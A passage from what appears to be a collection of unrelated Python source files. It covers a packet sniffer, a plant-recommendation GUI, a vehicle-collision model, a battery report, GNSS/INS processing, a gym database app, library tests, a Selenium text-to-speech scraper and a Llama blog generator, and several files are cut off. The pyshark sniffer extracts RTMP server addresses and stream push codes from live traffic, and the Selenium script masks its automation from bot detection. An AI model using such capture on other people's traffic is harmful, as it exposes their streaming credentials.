 text += data[\"word\"]\n\n            if len(text) >= len_segment or index == len(data_words) - 1:\n                data_word_expanded.append({\n                    'start': pos_start,\n                    'end': data[\"end\"],\n                    'text': text.strip()\n                })\n\n                text = \"\"\n\n        return data_word_expanded\n\n",
    "import pyshark\nimport threading\nimport asyncio\nimport json\n\n# \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6 JSON \u6570\u636e\nwith open('config.json', 'r', encoding='utf-8') as file:\n    json_data = file.read()\n\n# \u89e3\u6790 JSON \u6570\u636e\ndata = json.loads(json_data)\n\n# \u83b7\u53d6 tshark_path\u3001display_filter \u548c interface \u5b57\u6bb5\u7684\u503c\ntshark_path = data[\"tshark_path\"]\ndisplay_filter = data[\"display_filter\"]\ninterface = data[\"interface\"]\n\n# # \u66ff\u6362 'interface' \u4e3a\u4f60\u8981\u6293\u5305\u7684\u7f51\u7edc\u63a5\u53e3\uff0c\u5982 'eth0'\u3001'wlan0' \u7b49\n# interface = '\u4ee5\u592a\u7f51'\n# # \u66ff\u6362 'display_filter' \u4e3a\u4f60\u7684\u663e\u793a\u8fc7\u6ee4\u5668\n# display_filter = '((rtmpt) && (_ws.col.info contains \"connect\")) || (_ws.col.info contains \"releaseStream\")'\n# # \u66ff\u6362 'tshark_path' \u4e3a\u4f60\u7684 tshark.exe \u8def\u5f84\n# tshark_path = \"F:\\\\Program Files\\\\Wireshark\\\\tshark.exe\"\n\n\nclass PacketSniffer(threading.Thread):\n    def __init__(self, interface, display_filter):\n        super().__init__()\n        self.interface = interface\n        self.display_filter = display_filter\n\n    def run(self):\n        asyncio.set_event_loop(asyncio.new_event_loop())  # \u521b\u5efa\u5e76\u8bbe\u7f6e\u65b0\u7684\u4e8b\u4ef6\u5faa\u73af\n        capture = pyshark.LiveCapture(interface=self.interface, display_filter=self.display_filter,\n                                      tshark_path=tshark_path)\n        for packet in capture.sniff_continuously():\n            packet = str(packet)\n            server = filter_strings(packet, \"rtmp://\")\n            code = filter_strings(packet, \"stream-\")\n            if server:\n                print(\"\u670d\u52a1\u5668 \", server)\n            else:\n                print(\"\u63a8\u6d41\u7801 \", code[1:-1]) # \u53bb\u9664\u5f15\u53f7\n\n\ndef filter_strings(input_str, target_str):\n    words = input_str.split()  # \u5c06\u5b57\u7b26\u4e32\u6309\u7a7a\u683c\u5206\u5272\u6210\u5355\u8bcd\u5217\u8868\n    for word in words:\n        if target_str in word:\n            return word\n\n\nsniffer = PacketSniffer(interface, display_filter)\nsniffer.start()\nsniffer.join()\n",
    "import customtkinter\nfrom PIL import Image, ImageTk\nfrom ExpertSystem import GetRecommendations\nfrom Database import Database\nclass ScrollableCheckBoxFrame(customtkinter.CTkScrollableFrame):\n    def __init__(self, master, item_list, command=None, **kwargs):\n        super().__init__(master, **kwargs)\n        self.command = command\n        self.checkbox_list = []\n        for i, item in enumerate(item_list):\n            self.add_item(item)\n\n    def add_item(self, item):\n        checkbox = customtkinter.CTkCheckBox(self, text=item)\n        if self.command is not None:\n            checkbox.configure(command=self.command)\n        checkbox.grid(row=len(self.checkbox_list)+1, column=0, pady=(0, 10))\n        self.checkbox_list.append(checkbox)\n\n    def remove_item(self, item):\n        for checkbox in self.checkbox_list:\n            if item == checkbox.cget(\"text\"):\n                checkbox.destroy()\n                self.checkbox_list.remove(checkbox)\n                return\n    def get_checked_items(self):\n        return [checkbox.cget(\"text\") for checkbox in self.checkbox_list if checkbox.get() == 1]   \n    \nclass ScrollableResultFrame(customtkinter.CTkScrollableFrame):\n    def __init__(self, master, item_list, command=None, **kwargs):\n        super().__init__(master, **kwargs)\n        self.columnconfigure(0, weight=1)\n        self.command = command\n        self.results_list = []\n        if(len(item_list)==0):\n            noResult = customtkinter.CTkLabel(self, text=\"No Results\", font=('Arial', 20, 'bold'))\n            noResult.grid(row=0, column=0, padx=10, pady=10, sticky=\"nwe\")\n        else:\n            for i, item in enumerate(item_list):\n                self.add_item(item)\n    def add_item(self, item):\n        \n        plantData = [plant for plant in Database['plants'] if plant['name'] == str(list(item.values())[0])]\n        if(len(plantData) == 0):\n            print(\"Item not found in the database\")\n            return\n        plantData = plantData[0]\n        if len(plantData) == 0:\n            return\n        result = ResultFrame(\n            self,\n            plant_name=plantData.get(\"name\"),\n            plant_description=plantData.get(\"description\"),\n            image_path=plantData.get(\"image_path\")\n        )\n        if self.command is not None:\n            result.configure(command=self.command)\n        result.grid(row=len(self.results_list)+1, column=0, pady=(0, 10),sticky=\"nwe\")\n        self.results_list.append(result)\n\n    \nclass ScrollableRadiobuttonFrame(customtkinter.CTkScrollableFrame):\n    def __init__(self, master, item_list, command=None, **kwargs):\n        super().__init__(master, **kwargs)\n\n        self.command = command\n        self.radiobutton_variable = customtkinter.StringVar()\n        self.radiobutton_list = []\n        for i, item in enumerate(item_list):\n            self.add_item(item)\n\n    def add_item(self, item):\n        radiobutton = customtkinter.CTkRadioButton(self, text=item, value=item, variable=self.radiobutton_variable)\n        if self.command is not None:\n            radiobutton.configure(command=self.command)\n        radiobutton.grid(row=len(self.radiobutton_list), column=0, pady=(0, 10))\n        self.radiobutton_list.append(radiobutton)\n\n    def remove_item(self, item):\n        for radiobutton in self.radiobutton_list:\n            if item == radiobutton.cget(\"text\"):\n                radiobutton.destroy()\n                self.radiobutton_list.remove(radiobutton)\n                return\n\n    def get_checked_item(self):\n        return self.radiobutton_variable.get()\n    \nclass ValueInputsFrame(customtkinter.CTkFrame):\n\n    def __init__(self, master, **kwargs):\n        super().__init__(master, **kwargs)\n\n        # Register the validation function\n        validate_command = master.register(self.validate_numeric_input)\n\n        # Create labels and entry widgets for numeric values\n        # Label and entry for the first input\n        PHLevellabel = customtkinter.CTkLabel(self, text=\"PHLevel:\")\n        PHLevellabel.grid(row=0, column=0, padx=5, pady=5, sticky=\"w\")\n        self.PHLevelEntry = customtkinter.CTkEntry(self, validate=\"key\", validatecommand=(validate_command, '%P'))\n        self.PHLevelEntry.grid(row=0, column=1, padx=5, pady=5)\n        self.PHLevelEntry.insert(0, \"5\")\n\n        # Label and entry for the second input\n        Temperaturelabel = customtkinter.CTkLabel(self, text=\"Temperature:\")\n        Temperaturelabel.grid(row=1, column=0, padx=5, pady=5, sticky=\"w\")\n        self.TemperatureEntry = customtkinter.CTkEntry(self, validate=\"key\", validatecommand=(validate_command, '%P'))\n        self.TemperatureEntry.grid(row=1, column=1, padx=5, pady=5)\n        self.TemperatureEntry.insert(0, \"20\")\n\n        # Label and entry for the third input\n        Precipitationlabel = customtkinter.CTkLabel(self, text=\"Precipitation:\")\n        Precipitationlabel.grid(row=2, column=0, padx=5, pady=5, sticky=\"w\")\n        self.PrecipitationEntry = customtkinter.CTkEntry(self, validate=\"key\", val",
    "\nfrom dataclasses import dataclass\nfrom typing import Any, Dict, Optional, Tuple, Union\n\nimport numpy as np\nimport torch\n\nfrom gops.env.env_ocp.env_model.pyth_veh3dofconti_model import (\n    VehicleDynamicsModel,\n    Veh3dofcontiModel,\n    angle_normalize,\n)\nfrom gops.env.env_ocp.resources.ref_traj_model import MultiRefTrajModel\nfrom gops.utils.gops_typing import InfoDict\n\n\n@dataclass\nclass SurrVehicleModel:\n    # distance from front axle to rear axle\n    l: float = 3.0\n    dt: float = 0.1\n\n    def forward(self, state: torch.Tensor) -> torch.Tensor:\n        x, y, phi, u, delta = state.split(1, dim=-1)\n        next_x = x + u * torch.cos(phi) * self.dt\n        next_y = y + u * torch.sin(phi) * self.dt\n        next_phi = phi + u * torch.tan(delta) / self.l * self.dt\n        next_phi = angle_normalize(next_phi)\n        return torch.cat((next_x, next_y, next_phi, u, delta), dim=-1)\n\n\nclass Veh3dofcontiSurrCstrModel(Veh3dofcontiModel):\n    def __init__(\n        self,\n        pre_horizon: int,\n        device: Union[torch.device, str, None] = None,\n        path_para: Optional[Dict[str, Dict]] = None,\n        u_para: Optional[Dict[str, Dict]] = None,\n        surr_veh_num: int = 1,\n        veh_length: float = 4.8,\n        veh_width: float = 2.0,\n        **kwargs: Any,\n    ):\n        self.state_dim = 6\n        self.ego_obs_dim = 6\n        self.ref_obs_dim = 4\n        super(Veh3dofcontiModel, self).__init__(\n            obs_dim=self.ego_obs_dim + self.ref_obs_dim * pre_horizon + surr_veh_num * 4,\n            action_dim=2,\n            dt=0.1,\n            action_lower_bound=[-np.pi / 6, -3],\n            action_upper_bound=[np.pi / 6, 3],\n            device=device,\n        )\n        self.vehicle_dynamics = VehicleDynamicsModel()\n        self.ref_traj = MultiRefTrajModel(path_para, u_para)\n        self.pre_horizon = pre_horizon\n\n        self.surr_veh_model = SurrVehicleModel()\n        self.surr_veh_num = surr_veh_num\n        self.veh_length = veh_length\n        self.veh_width = veh_width\n\n        self.lane_width = 4.0\n        self.upper_bound = 0.5 * self.lane_width\n        self.lower_bound = -1.5 * self.lane_width\n\n    def forward(\n        self,\n        obs: torch.Tensor,\n        action: torch.Tensor,\n        done: torch.Tensor,\n        info: InfoDict,\n    ) -> Tuple[torch.Tensor, torch.Tensor, torch.Tensor, InfoDict]:\n        ego_obs = obs[:, : self.ego_obs_dim + self.ref_obs_dim * self.pre_horizon]\n        next_ego_obs, reward, next_done, next_info = super().forward(\n            ego_obs, action, done, info\n        )\n\n        surr_state = info[\"surr_state\"]\n        next_surr_state = self.surr_veh_model.forward(surr_state)\n        next_state = next_info[\"state\"]\n        next_surr_obs = next_surr_state[..., :4] - next_state[:, :4].unsqueeze(1)\n        next_surr_obs = next_surr_obs.reshape((-1, self.surr_veh_num * 4))\n        next_obs = torch.cat((next_ego_obs, next_surr_obs), dim=1)\n\n        next_info.update({\"surr_state\": next_surr_state})\n        next_info.update({\"constraint\": self.get_constraint(next_obs, next_info)})\n                \n        return next_obs, reward, next_done, next_info\n\n    def get_constraint(self, obs: torch.Tensor, info: InfoDict) -> torch.Tensor:\n        # collision detection using bicircle model\n        # distance from vehicle center to front/rear circle center\n        d = (self.veh_length - self.veh_width) / 2\n        # circle radius\n        r = np.sqrt(2) / 2 * self.veh_width\n\n        x, y, phi = info[\"state\"][:, :3].split(1, dim=1)\n        ego_center = torch.stack(\n            (\n                torch.cat((x + d * torch.cos(phi), y + d * torch.sin(phi)), dim=1),\n                torch.cat((x - d * torch.cos(phi), y - d * torch.sin(phi)), dim=1),\n            ),\n            dim=1,\n        )\n\n        surr_x, surr_y, surr_phi = info[\"surr_state\"][..., :3].split(1, dim=2)\n        surr_center = torch.stack(\n            (\n                torch.cat(\n                    (\n                        surr_x + d * torch.cos(surr_phi),\n                        surr_y + d * torch.sin(surr_phi),\n                    ),\n                    dim=2,\n                ),\n                torch.cat(\n                    (\n                        surr_x - d * torch.cos(surr_phi),\n                        surr_y - d * torch.sin(surr_phi),\n                    ),\n                    dim=2,\n                ),\n            ),\n            dim=2,\n        )\n\n        min_dist = np.finfo(np.float32).max * torch.ones_like(x)\n        for i in range(2):\n            # front and rear circle of ego vehicle\n            for j in range(2):\n                # front and rear circle of surrounding vehicles\n                dist = torch.linalg.norm(\n                    ego_center[:, i].unsqueeze(1) - surr_center[..., j, :], dim=2\n                )\n                min_dist = torch.minimum(\n                    min_dist, torch.min(dist, dim=1, keepdim=True).values\n                )\n\n        ego_to_veh_violation = 2 * r - min_dist\n\n        # road boundary ",
    "import sys\n\ndef get_config_params():\n    \"\"\"\n    Retrieves configuration parameters based on command-line arguments and default values.\n    \"\"\"\n    config_params = {\n        \"outputAllVideos\": False,\n        \"archiveVideos\": False,\n        \"avoidImageRecognition\": False, # Skips image recognition for archiving/deletion\n        \"searchArchived\": False,\n        \"fileTypesToCheckFor\": [\"mp4\"], # Default file type for TikTok videos\n        \"fileNameLength\": 32, # 32 seems to be the length of TikTok video names\n        \"fileNameIsAlumn\": True,\n        \"fileCreatedAfter\": 1472688000, # 1472688000 is the timestamp for September 1, 2016\n        \"textToCheckFor\": \"TikTok\",\n    }\n\n    if \"--output-all\" in sys.argv:\n        config_params[\"outputAllVideos\"] = True\n    if \"--archive\" in sys.argv:\n        config_params[\"archiveVideos\"] = True\n    if \"--search-archived\" in sys.argv:\n        config_params[\"searchArchived\"] = True\n        config_params[\"archiveVideos\"] = False\n    if \"--avoid-image-recognition\" in sys.argv:\n        config_params[\"avoidImageRecognition\"] = True\n    if \"--file-types\" in sys.argv:\n        config_params[\"fileTypesToCheckFor\"] = []\n        index = sys.argv.index(\"--file-types\") + 1\n        if index < len(sys.argv):\n            file_types = sys.argv[index].split(',')\n            config_params[\"fileTypesToCheckFor\"].extend(file_types)\n    if \"--file-name-length\" in sys.argv:\n        index = sys.argv.index(\"--file-name-length\") + 1\n        if index < len(sys.argv):\n            config_params[\"fileNameLength\"] = int(sys.argv[index])\n    if \"--file-name-is-not-alumn\" in sys.argv:\n        config_params[\"fileNameIsAlumn\"] = False\n    if \"--file-created-after\" in sys.argv:\n        index = sys.argv.index(\"--file-created-after\") + 1\n        if index < len(sys.argv):\n            config_params[\"fileCreatedAfter\"] = int(sys.argv[index])\n    if \"--text-to-check\" in sys.argv:\n        index = sys.argv.index(\"--text-to-check\") + 1\n        if index < len(sys.argv):\n            config_params[\"textToCheckFor\"] = sys.argv[index]\n\n    return config_params\n",
    "import os\nimport subprocess\nfrom bs4 import BeautifulSoup\nfrom datetime import date\n\n\ndef generate_battery_report():\n    subprocess.run(['powercfg', '/batteryreport'], capture_output=True)\n\n\ndef parse_battery_report():\n    report_path = 'battery-report.html'\n    with open(report_path, 'r') as file:\n        soup = BeautifulSoup(file, 'html.parser')\n        report_date = soup.find(string=str(date.today()) + \" \")\n        report_time = soup.find(string=str(date.today()) + \" \").find_next('span').text\n        designed_capacity = int(soup.find(string=\"DESIGN CAPACITY\").find_next('td').text.strip().split()[0].replace(\",\", \"\"))\n        full_charge_capacity = int(soup.find(string=\"FULL CHARGE CAPACITY\").find_next('td').text.strip().split()[0].replace(\",\", \"\"))\n    return report_date, report_time, designed_capacity, full_charge_capacity\n\n\ndef calculate_remaining_capacity_percentage(designed_capacity, full_charge_capacity):\n    remaining_capacity_percentage = (full_charge_capacity/designed_capacity)*100\n    return remaining_capacity_percentage\n\n\ndef main():\n    generate_battery_report()\n\n    report_date, report_time, designed_capacity, full_charge_capacity = parse_battery_report()\n\n    remaining_capacity_percentage = calculate_remaining_capacity_percentage(designed_capacity, full_charge_capacity)\n\n    print(\"Report Date : \", report_date)\n    print(\"Report Time : \", report_time)\n    print(\"Designed Capacity = \", designed_capacity, \"mWh\")\n    print(\"Full Charge Capacity = \", full_charge_capacity, \"mWh\")\n    print(\"Battery Health = {:.2f}% \".format(remaining_capacity_percentage))\n\n\nif __name__ == \"__main__\":\n    main()",
    "'''\n  ******************************************************************************\n  * @file           : GNSS_INS.py\n  * @author         : ZhangKai\n  * @date           : 2024/4/21\n  * @description    : \n  ******************************************************************************\n'''\nimport math\n\nimport numpy as np\nimport matplotlib.pyplot as plt\n\ng = 9.79338  # \u6b66\u6c49\u7684g\nv = np.zeros(3, dtype=np.float64)\nvg = np.zeros(3, dtype=np.float64)\npp = np.zeros(3, dtype=np.float64)\n\nQ = np.identity(3, dtype=np.float64) * 0.02\nR = np.identity(3, dtype=np.float64) * 0.1\nH = np.diag([1.0, 1.0, 1.0])\n\nA = np.identity(3, dtype=np.float64)\nBb = np.identity(3, dtype=np.float64)\nIi = np.identity(3, dtype=np.float64)\nx_ba_k1 = np.zeros(3, dtype=np.float64)\nx_ba_k = np.zeros(3, dtype=np.float64)\nx_ba_k_ = np.zeros(3, dtype=np.float64)\np_k = np.identity(3, dtype=np.float64)\np_k1 = np.zeros((3, 3), dtype=np.float64)\np_k_ = np.zeros((3, 3), dtype=np.float64)\nu_k = np.zeros(3, dtype=np.float64)\nz_k = np.zeros(3, dtype=np.float64)\nK_k = np.zeros((3, 3), dtype=np.float64)\n\ndt = 0.005\n\ndef azimuth(lat1, lon1, lat2, lon2):\n    # \u5c06\u7ecf\u7eac\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\n    lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])\n\n    # \u8ba1\u7b97\u65b9\u4f4d\u89d2\n    y = math.sin(lon2 - lon1) * math.cos(lat2)\n    x = math.cos(lat1) * math.sin(lat2) - math.sin(lat1) * math.cos(lat2) * math.cos(lon2 - lon1)\n    azimuth_rad = math.atan2(y, x)\n\n    # \u5c06\u5f27\u5ea6\u8f6c\u6362\u4e3a\u89d2\u5ea6\n    azimuth_deg = math.degrees(azimuth_rad)\n\n    # \u8c03\u6574\u89d2\u5ea6\u8303\u56f4\u5728[0, 360)\u4e4b\u95f4\n    azimuth_deg = (azimuth_deg + 360) % 360\n\n    return azimuth_deg\n\nif __name__ == '__main__':\n\n    # \u8bfb\u53d6\u6570\u636e\n    data = np.genfromtxt(\"../datasets/ICM20602/ICM20602.txt\", dtype=float)  # \u5c06\u6587\u4ef6\u4e2d\u6570\u636e\u52a0\u8f7d\u5230data\u6570\u7ec4\u91cc\n    data_truth = np.genfromtxt(\"../datasets/ICM20602/truth.nav\", dtype=float)  # \u5c06\u6587\u4ef6\u4e2d\u6570\u636e\u52a0\u8f7d\u5230data\u6570\u7ec4\u91cc\n    data_GNSS = np.genfromtxt(\"../datasets/GNSS RTK/GNSS_RTK.txt\", dtype=float)  # \u5c06\u6587\u4ef6\u4e2d\u6570\u636e\u52a0\u8f7d\u5230data\u6570\u7ec4\u91cc\n\n    \"\"\"[ seconds of week, Omega_x, Omega_y, Omega_z,velocity_x,velocity_y, velocity_z]\"\"\"\n    print(data.shape)\n    xx = []\n    yy = []\n    zz = []\n    outputdata = []\n    outputdata1 = []\n\n    x_ba_k1 = np.array([1.40664, 0.38285, 276.51564]) * np.pi / 180.0\n    x_ba_k = x_ba_k1\n\n    count_truth = 0\n    count_GNSS = 0\n\n    # =============================================================================================\n    # \u771f\u503c\u5c55\u5f00\n    yaw_0 = data_truth[:, 10]\n\n    for i in range(1, len(yaw_0)):\n        # if i == 50000:\n        #     yaw_0[i:] = yaw_0[i:] + 360\n        if yaw_0[i] - yaw_0[i - 1] > 220:\n            yaw_0[i] = yaw_0[i] - 360\n        if yaw_0[i] - yaw_0[i - 1] < -220:\n            yaw_0[i] = yaw_0[i] + 360\n    # =========================================================================================================\n        # GNSS\n    yaw_GNSS = 270\n    yaw_G=[270]\n    print(\"GNSS\",len(data_GNSS))\n    if not (data_GNSS[count_GNSS][1] == data_GNSS[count_GNSS + 1][1] and data_GNSS[count_GNSS][2] ==\n            data_GNSS[count_GNSS + 1][2]):\n        yaw_GNSS = azimuth(data_GNSS[count_GNSS][1], data_GNSS[count_GNSS][2], data_GNSS[count_GNSS + 1][1],\n                           data_GNSS[count_GNSS + 1][2])\n        yaw_G.append(yaw_GNSS)\n\n    for i in range(0, len(data_GNSS)-1):\n\n        if not (data_GNSS[i][1] == data_GNSS[i + 1][1] and data_GNSS[i][2] ==\n                data_GNSS[i + 1][2]):\n            yaw_GNSS = azimuth(data_GNSS[i][1], data_GNSS[i][2],\n                               data_GNSS[i + 1][1], data_GNSS[i + 1][2])\n\n            yaw_G.append(yaw_GNSS)\n        print(len(yaw_G))\n        for i in range(1, len(yaw_G)):\n            if yaw_G[i] - yaw_G[i - 1] > 220:\n                yaw_G[i] = yaw_G[i] - 360\n            if yaw_G[i] - yaw_G[i - 1] < -220:\n                yaw_G[i] = yaw_G[i] + 360\n    # =========================================================================================================\n\n\n    # =============================================================================================\n\n    for i in range(0, len(data)):\n    # for i in range(0, 30000):\n        if not i == 0:\n            dt = data[i][0] - data[i - 1][0]\n\n        time_IMU = data[i][0]\n        time_truth = data_truth[count_truth][1]\n\n        # =========================================================================================================\n        # \u771f\u503c\u65f6\u95f4\u5bf9\u9f50\n        while np.abs(time_IMU - time_truth) > np.abs(time_IMU - data_truth[count_truth + 1][1]):\n            count_truth += 1\n            time_truth = data_truth[count_truth][1]\n            if count_truth == len(data_truth) - 1:\n                break\n            # print(time_IMU,time_truth)\n        # =============================================================================================\n        if  count_GNSS < len(data_GNSS) -2 :\n            if time_IMU > data_GNSS[count_GNSS + 1][0]:\n                count_GNSS += 1\n\n            k=(yaw_G[count_GNSS+1]-yaw_G[count_GNSS])/(data_GNSS[count_GNSS +1][0]-data_GNSS[count_GNSS ][0] )\n\n            yaw_GNSS = yaw_G[count_GNSS] + k * (time_IMU - data_GNSS[count",
    "#<----------------- DATABASE CONNECTION FUNCTIONS ----------------->\n\nimport psycopg2\nfrom psycopg2 import Error\nimport random\nfrom tabulate import tabulate\n\n# Database connection parameters\nDB_NAME = \"#YOUR DATABASE NAME#\"    \nDB_USER = \"#YOUR DATABASE USER#\"\nDB_PASSWORD = \"#YOUR PASSWORD TO CONNECT TO DATABASE#\"\nDB_HOST = \"localhost\"\nDB_PORT = \"5432\"\n\ndef connect():\n    try:\n        connection = psycopg2.connect(\n            user=DB_USER,\n            password=DB_PASSWORD,\n            host=DB_HOST,\n            port=DB_PORT,\n            database=DB_NAME\n        )\n        return connection\n    except Error as e:\n        print(\"Error while connecting to PostgreSQL:\", e)\n\n#<----------------- MEMBER FUNCTIONS ----------------->\n\ndef displayMemberDashboard(name, memberID):\n    menu = [\n        \"1. Update profile information\",\n        \"2. View Profile Information\",\n        \"3. Manage Schedules\",\n        \"4. View Upcoming Schedules\",\n        \"5. RECOMMENDED CLASSES!!!\",\n        \"6. Logout\"\n    ]\n    print(f\"\\nWelcome Member {name}!\")\n    print(\"\\nWhat would you like to do?\")\n    print(\"\\n\".join(menu))\n    choice = input(\"\\nEnter your choice: \")\n    if choice == \"1\":\n        updateProfile(name, memberID)\n    elif choice == \"2\":\n        viewProfile(name, memberID)\n    elif choice == \"3\":\n        manageSchedules(name, memberID)\n    elif choice == \"4\":\n        viewSchedules(name, memberID)\n    elif choice == \"5\":\n        viewRecommendedClasses(name, memberID)\n    elif choice == \"6\":\n        main()\n    else:\n        print(\"\\nInvalid choice. Please try again.\\n\")\n        displayMemberDashboard(name, memberID)\n\ndef viewRecommendedClasses(name, memberID):\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT ClassID FROM Fitness_Class;\")\n    possibleID = cursor.fetchall()\n    randomIndex = random.randint(0, len(possibleID) - 1)\n    if possibleID:\n        cursor.execute(\"SELECT ClassName, Schedule, RoomID, TrainerID FROM Fitness_Class WHERE ClassID = %s;\", (possibleID[randomIndex][0],))\n        recommended = cursor.fetchone()\n        print(\"Recommended class:\")\n        headers = [\"Class Name\", \"Schedule\", \"Room ID\", \"Trainer ID\"]\n        print(tabulate([headers, recommended], headers=\"firstrow\", tablefmt=\"grid\"))\n    else:\n        print(\"No recommended classes.\")\n    cursor.close()\n    connection.close()\n    displayMemberDashboard(name, memberID)\n\ndef viewSchedules(name, memberID):\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT SessionID, Date, Time, TrainerID FROM Training_Session WHERE MemberID = %s;\", (memberID,))\n    sessions = cursor.fetchall()\n    if sessions:\n        print(\"\\nUpcoming Training sessions:\")\n        headers = [\"Session ID\", \"Date\", \"Time\", \"Trainer ID\"]\n        print(tabulate([headers] + sessions, headers=\"firstrow\", tablefmt=\"grid\"))\n    else:\n        print(\"No upcoming Training sessions.\")\n    \n    cursor.execute(\"\"\"SELECT FC.ClassID, FC.ClassName, FC.Schedule, FC.RoomID, FC.TrainerID \n                      FROM Fitness_Class FC \n                      JOIN Registers R ON FC.ClassID = R.ClassID \n                      WHERE R.MemberID = %s;\"\"\", (memberID,))\n    classes = cursor.fetchall()\n    if classes:\n        print(\"\\nUpcoming Group Fitness Classes:\")\n        headers = [\"Class ID\", \"Class Name\", \"Schedule\", \"Room ID\", \"Trainer ID\"]\n        print(tabulate([headers] + classes, headers=\"firstrow\", tablefmt=\"grid\"))\n    else:\n        print(\"No upcoming Group Fitness Classes.\")\n    cursor.close()\n    connection.close()\n    displayMemberDashboard(name, memberID)\n\ndef manageSchedules(name, memberID):\n    menu = [\n        \"1. Schedule personal training session\",\n        \"2. Schedule group fitness class\",\n        \"3. Reschedule personal training session\",\n        \"4. Cancel personal training session\",\n        \"5. Cancel group fitness class\"\n    ]\n    print(\"\\nWhat would you like to do?\")\n    print(\"\\n\".join(menu))\n    choice = input(\"\\nEnter your choice: \")\n    connection = connect()\n    cursor = connection.cursor()\n    if choice == \"1\":\n        print(\"\\nBelow are the available training sessions:\")\n        cursor.execute(\"\"\"\n            SELECT t.TrainerID, t.Name, t.Specialization, t.AvailableTimes\n            FROM Trainer t\n            LEFT JOIN Training_Session ts ON t.TrainerID = ts.TrainerID\n            WHERE ts.TrainerID IS NULL;\n        \"\"\")\n        sessions = cursor.fetchall()\n        if sessions:\n            for session in sessions:\n                print(session)\n            trainerID = input(\"Enter ID of the trainer you want to schedule a session with: \")\n            date = input(\"Enter date of session: \")\n            time = input(\"Enter time of session: \")\n            cursor.execute(\"INSERT INTO Training_Session (Date, Time, MemberID, TrainerID) VALUES (%s, %s, %s, %s);\", (date, time, memberID, trainerID))\n            connection.commit()\n            print(\"Session scheduled successfully.\")\n        else:\n            print(\"No t",
    "from friendly_sequences import Seq\n\n\ndef test_usage():\n    def add_one(i: int) -> int:\n        return i + 1\n\n    assert Seq((1, 2, 3)).map(add_one).sum() == 9\n    assert Seq((1,)).sum() == 1\n    assert next(Seq((1, 2)).take(1)) == 1\n    assert (\n        Seq(\n            (\n                (1, 2),\n                (3, 4),\n            )\n        )\n        .flat_map(add_one)\n        .sum()\n        == 14\n    )\n    assert \"\".join(Seq(\"cba\").sort()) == \"abc\"\n    assert (\n        Seq((1, 2))\n        .zip(Seq((3, 4)))\n        .flat_map(lambda x: x)\n        .sort()\n        .map(str)\n        .reduce(lambda left, right: left + right)\n    ) == \"1234\"\n\n\ndef test_chaining():\n    assert (\n        Seq[int]((1, 2))\n        .zip(Seq[int]((3, 4)))\n        .flat_map(lambda x: x)\n        .filter(lambda x: x != 2)\n        .sort()\n        .map(str)\n        .fold(lambda left, right: f\"{left}{right}\", \"\")\n    ) == \"134\"\n\n\ndef test_flatten():\n    assert Seq(((1, 2), (3, 4))).flatten().to_tuple() == (1, 2, 3, 4)\n\n\ndef test_accessing_methods():\n    assert Seq((1,)).head() == 1\n    assert Seq((1,)).to_tuple() == (1,)\n    assert Seq((1,)).to_list() == [1]\n",
    "import logging\r\nimport time\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom selenium.webdriver.chrome.options import Options\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\n\r\n# Set up logging to suppress console logs\r\nlogging.getLogger('selenium').setLevel(logging.WARNING)\r\n\r\n# Set up Chrome options\r\nchrome_options = Options()\r\nchrome_options.add_argument(\"--headless\")\r\nchrome_options.add_argument(\"--log-level=3\")\r\nchrome_options.add_argument(\"--disable-blink-features=AutomationControlled\")\r\n# Run in headless mode (without opening a browser window)\r\n\r\n# Create a Service object with WebDriverManager to automatically manage the ChromeDriver binary\r\nchrome_service = Service(ChromeDriverManager().install())\r\n\r\n# Create a Chrome driver instance with the specified options and service\r\ndriver = webdriver.Chrome(service=chrome_service, options=chrome_options)\r\n\r\n# Navigate to the website\r\ndriver.get(\"https://tts.5e7en.me/\")\r\n\r\ndef speak(text):\r\n    try:\r\n        # Wait for the element to be clickable\r\n        element_to_click = WebDriverWait(driver, 10).until(\r\n            EC.element_to_be_clickable((By.XPATH, '//*[@id=\"text\"]'))\r\n        )\r\n\r\n        # Perform the click action\r\n        element_to_click.click()\r\n\r\n        # Input text into the element\r\n        text_to_input = text\r\n        element_to_click.send_keys(text_to_input)\r\n        print(text_to_input)\r\n\r\n        # Calculate sleep duration based on sentence length\r\n        sleep_duration = min(0.2 + len(text) // 10,15)  # Minimum sleep is 3 seconds, maximum is 10 seconds\r\n\r\n        # Wait for the button to be clickable\r\n        button_to_click = WebDriverWait(driver, 10).until(\r\n            EC.element_to_be_clickable((By.XPATH, '//*[@id=\"button\"]'))\r\n        )\r\n\r\n        # Perform the click action on the button\r\n        button_to_click.click()\r\n\r\n        # Sleep for dynamically calculated duration\r\n        time.sleep(sleep_duration)\r\n\r\n        # Clear the text box for the next sentence\r\n        element_to_click.clear()\r\n\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n\r\n\r\n",
    "import streamlit as st\r\nfrom langchain.prompts import PromptTemplate\r\nfrom langchain.llms import CTransformers\r\n\r\n## Function To get response from LLAma 2 model\r\n\r\ndef getLLamaresponse(input_text,no_words,blog_style):\r\n\r\n    ### LLama2 model\r\n    llm=CTransformers(model='models/llama-2-7b-chat.ggmlv3.q8_0.bin',\r\n                      model_type='llama',\r\n                      config={'max_new_tokens':256,\r\n                              'temperature':0.01})\r\n    \r\n    ## Prompt Template\r\n\r\n    template=\"\"\"\r\n        Write a blog for {blog_style} job profile for a topic {input_text}\r\n        within {no_words} words.\r\n            \"\"\"\r\n    \r\n    prompt=PromptTemplate(input_variables=[\"blog_style\",\"input_text\",'no_words'],\r\n                          template=template)\r\n    \r\n    ## Generate the ressponse from the LLama 2 model\r\n    response=llm(prompt.format(blog_style=blog_style,input_text=input_text,no_words=no_words))\r\n    print(response)\r\n    return response\r\n\r\n\r\n\r\n\r\n\r\n\r\nst.set_page_config(page_title=\"Generate Blogs\",\r\n                    page_icon='\ud83e\udd16',\r\n                    layout='centered',\r\n                    initial_sidebar_state='collapsed')\r\n\r\nst.header(\"Generate the Blogs \ud83e\udd16\ud83e\udd16\")\r\n\r\ninput_text=st.text_input(\"Enter the Blog Topic\")\r\n\r\n## creating to more columns for additonal 2 fields\r\n\r\ncol1,col2=st.columns([5,5])\r\n\r\nwith col1:\r\n    